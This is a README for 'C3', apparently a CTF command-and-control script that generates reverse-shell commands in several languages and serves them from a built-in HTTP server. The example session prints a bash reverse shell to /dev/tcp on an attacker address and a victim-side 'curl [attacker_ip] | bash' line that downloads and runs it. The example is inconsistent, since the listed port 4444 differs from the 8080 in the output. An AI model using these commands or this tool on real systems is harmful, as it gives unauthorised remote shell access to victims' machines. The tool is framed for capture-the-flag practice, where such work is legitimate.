# C3 - The CTF Command and Control
```
_________ ________
\_   ___ \_____  \
/    \  \/  _(__  <    ______
\     \____/       \  /_____/
 \______  /______  /
        \/       \/
___________.__             _______________________________
\__    ___/|  |__   ____   \_   ___ \__    ___/\_   _____/
  |    |   |  |  \_/ __ \  /    \  \/ |    |    |    __)
  |    |   |   Y  \  ___/  \     \____|    |    |     \
  |____|   |___|  /\___  >  \______  /|____|    \___  /
                \/     \/          \/               \/
                                                .___
  ____  ____   _____   _____ _____    ____    __| _/
_/ ___\/  _ \ /     \ /     \__  \  /    \  / __ |
\  \__(  <_> )  Y Y  \  Y Y  \/ __ \|   |  \/ /_/ |
 \___  >____/|__|_|  /__|_|  (____  /___|  /\____ |
     \/            \/      \/     \/     \/      \/
  ____                         __                .__
 /  _ \     ____  ____   _____/  |________  ____ |  |
 >  _ </\ _/ ___\/  _ \ /    \   __\_  __ \/  _ \|  |
/  <_\ \/ \  \__(  <_> )   |  \  |  |  | \(  <_> )  |__
\_____\ \  \___  >____/|___|  /__|  |__|   \____/|____/

   by Blaudoom
```

This is a VERY simple script that can be used to create your basic reverse-shell commands.

Shells from: [PentestMonkey](https://github.com/pentestmonkey)


```
usage: sheller.py [-h] [-l SHELL] [-a LOCALADDR] [-p LOCALPORT] [-o OUTFILE]
                  [-s] [-i INTERFACE] [--httpport HTTPPORT]

A script to generate reverse shells on various languages and serve them on
http-server.

optional arguments:
  -h, --help           show this help message and exit
  -l SHELL             Language to identify the shell to be built. Use -s to
                       see available shells.
  -a LOCALADDR         Address to connect back to
  -p LOCALPORT         Port to connect back to
  -s HTTPPORT  Port to start HTTP server in, default 80
  ```
## Usage
```
Available commands:

reverse [method] - Creates a reverse shell and either serves it over http or prints it (Method either serve or print)
proxy [url/preset] - Downloads and serves a single webpage over http. Param 1 is an url or a preset name. 
exec [command] - Serves the given command as text on http-server
set [option] [value] - Sets the value for an option, overwriting the one given as a commandline param.
shells - Prints available shell-types
presets - Prints presets
options - Prints options
stop - Kill the http-server
exit - Exit the application
```


## Examples:
### Reverse on http-server
  ```
$ sudo python3 sheller.py -s 80 -l bash -a 169.254.138.91

Options:

shell:bash
localAddr:169.254.138.91
localPort:4444
interface:None
httpPort:80


C3>reverse serve
Opening shellfile: bash
C3>Starting webserver on port 80

C3>127.0.0.1 - - [12/Aug/2021 14:02:07] "GET / HTTP/1.1" 200 -
127.0.0.1 - - [12/Aug/2021 14:02:07] "GET /favicon.ico HTTP/1.1" 200 -
```

produces:

```
bash -i >& /dev/tcp/169.254.138.91/8080 0>&1
```

and serves it on http-server at all interfaces on port 80 at / http://localhost
  
on victim machine:
```
curl [attacker_ip] | bash
```

should run the reverse shell generated, if bash is present and http is not blocked.
